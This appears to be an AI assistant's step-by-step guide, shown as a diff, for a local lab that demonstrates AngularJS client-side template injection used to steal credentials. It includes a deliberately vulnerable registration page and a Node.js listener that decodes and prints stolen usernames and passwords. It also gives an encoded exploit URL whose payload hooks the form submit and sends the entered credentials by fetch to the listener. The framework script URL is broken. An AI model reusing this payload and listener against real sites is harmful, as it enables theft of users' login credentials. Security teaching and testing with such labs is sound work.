@@ -1,0 +1,137 @@
+To test this exact Client-Side Template Injection (CSTI) and credential-harvesting exploit scenario locally on your machine, you need two pieces: the vulnerable registration page and the attacker's listener dashboard to capture the stolen data.
+Follow these steps to set up the full lab in your ~/hack/login folder.
+------------------------------
+## Step 1: Create the Vulnerable Page (register.html)
+This file simulates a registration panel built with an older version of AngularJS that is highly vulnerable to template breakouts. If it sees ${...} or custom constructors inside an input field or error log, it evaluates them as live browser code.
+Run this command to create the file:
+
+cat << 'EOF' > register.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Target Lab - Onboarding Registration Panel</title>
+    <!-- Loading an expression-parsing framework engine to simulate CSTI vulnerability -->
+    <script src="https://googleapis.com"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f3; padding: 40px; text-align: center; }
+        .reg-box { background: white; padding: 40px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: left; }
+        h2 { margin-top: 0; color: #333; border-bottom: 2px solid #28a745; padding-bottom: 10px; }
+        label { font-weight: bold; color: #555; display: block; margin-top: 15px; }
+        input { width: 100%; padding: 12px; margin: 6px 0 15px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #218838; }
+        .debug-notice { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; border-left: 4px solid #ffc107; }
+    </style>
+</head>
+<body ng-app="">
+
+    <div class="reg-box">
+        <h2>Create Account</h2>
+        
+        <!-- VULNERABLE ELEMENT: Reflects the URL query context directly inside the active framework scope template -->
+        <div class="debug-notice" id="vulnerable-node">
+            System initialization active...
+        </div>
+
+        <form id="registrationForm" action="#" method="POST" onsubmit="event.preventDefault(); alert('Registration processed natively!');">
+            <label>Choose Username or Phone:</label>
+            <input type="text" name="username" id="username" placeholder="e.g. abang123" required>
+            
+            <label>Set Access Password:</label>
+            <input type="password" name="password" id="password" placeholder="Enter secure password" required>
+            
+            <button type="submit">Complete Registration</button>
+        </form>
+    </div>
+
+    <script>
+        // Extract the parameters from the URL address bar
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlPasswordInput = urlParams.get('password');
+
+        if (urlPasswordInput) {
+            // Unsafely pushes raw parameter into the template container.
+            // If the query is "${alert(1)}", the template framework processes it upon rendering.
+            document.getElementById('vulnerable-node').innerHTML = "Verifying preset parameter trace: " + urlPasswordInput;
+            document.getElementById('password').value = urlPasswordInput;
+        }
+    </script>
+</body>
+</html>
+EOF
+
+------------------------------
+## Step 2: Create the Attacker Server (listener.js)
+This lightweight Node.js script acts as the attacker's server to collect stolen credentials. It runs a backend web worker that logs arriving payloads and automatically decodes the stolen Base64 strings back into plaintext usernames and passwords.
+Run this command to create the script:
+
+cat << 'EOF' > listener.js
+const http = require('http');
+const url = require('url');
+
+const PORT = 9000;
+
+const server = http.createServer((req, res) => {
+    // Set headers to allow cross-origin requests from your local lab portal page
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
+    
+    const parsedUrl = url.parse(req.url, true);
+    
+    if (parsedUrl.pathname === '/log' && parsedUrl.query.data) {
+        try {
+            const rawBase64Data = parsedUrl.query.data;
+            // Decode the arriving encrypted Base64 string payload back to clear text strings
+            const decodedJsonText = Buffer.from(rawBase64Data, 'base64').toString('utf-8');
+            const credentials = JSON.parse(decodedJsonText);
+            
+            console.log(`\n======================================================`);
+            console.log(`🚨 [EXFILTRATION RECEIVED FROM USER CLIENT BROWSING SESSION]`);
+            console.log(`👤 STOLEN ACCOUNT ID : ${credentials.account}`);
+            console.log(`🔑 STOLEN PASSWORD   : ${credentials.secret}`);
+            console.log(`🎯 ORIGIN SOURCE SCOPE: ${credentials.captured_at}`);
+            console.log(`======================================================`);
+        } catch (e) {
+            console.log("[-] Received abnormal tracing request connection.");
+        }
+    }
+    
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end('OK');
+});
+
+server.listen(PORT, () => {
+    console.log(`\n📡 [ATTACKER LISTENER ENGINE RUNNING] -> Watching port ${PORT} for inbound credentials...`);
+});
+EOF
+
+------------------------------
+## Step 3: Run Your Local Exploit Campaign Lab
+Now everything is set up, launch both services inside your terminal folders to watch how data traverses from the page to the listener server.
+
+   1. Start the Attacker Listener Server:
+   Open a secondary terminal tab or run it in the background:
+   
+   node listener.js
+   
+   2. Start the Lab Website Server:
+   Launch Python's instant file sharer inside your ~/hack/login folder to host the webpage:
+   
+   python3 -m http.server 8080
+   
+   3. Trigger the Complete Exploit URL Path:
+   Open your browser and copy-paste this fully encoded URL. This URL holds the template expression string containing the weaponized form stealer pointing right at your local port 9000 listener:
+   
+   http://localhost:8080/register.html?password=%7B%7Bconstructor.constructor%28%22document.getElementById%28%27registrationForm%27%29.addEventListener%28%27submit%27%2C%20function%28%29%20%7B%20const%20u%20%3D%20document.getElementById%28%27username%27%29.value%3B%20const%20p%20%3D%20document.getElementById%28%27password%27%29.value%3B%20fetch%28%27http%3A%2F%2Flocalhost%3A9000%2Flog%3Fdata%3D%27%20%2B%20btoa%28JSON.stringify%28%7Baccount%3Au%2C%20secret%3Ap%2C%20captured_at%3Awindow.location.hostname%7D%29%29%29%3B%20%7D%29%22%29%28%29%7D
+   
+   
+## 🎯 Test the Flow
+
+   1. Look at your webpage; the layout appears normal and legitimate.
+   2. Type a username (e.g., abang_test) and a password (e.g., MySecretPIN123!) inside the form boxes.
+   3. Hit the "Complete Registration" button.
+   4. Check your terminal where listener.js is running—the plain text credentials will print directly onto your screen.
+
+Would you like to analyze how to adjust your main Puppeteer scanner tool script file to flag when a page dynamically attempts to interact with an outside domain port like 9000 during input testing phases?
+
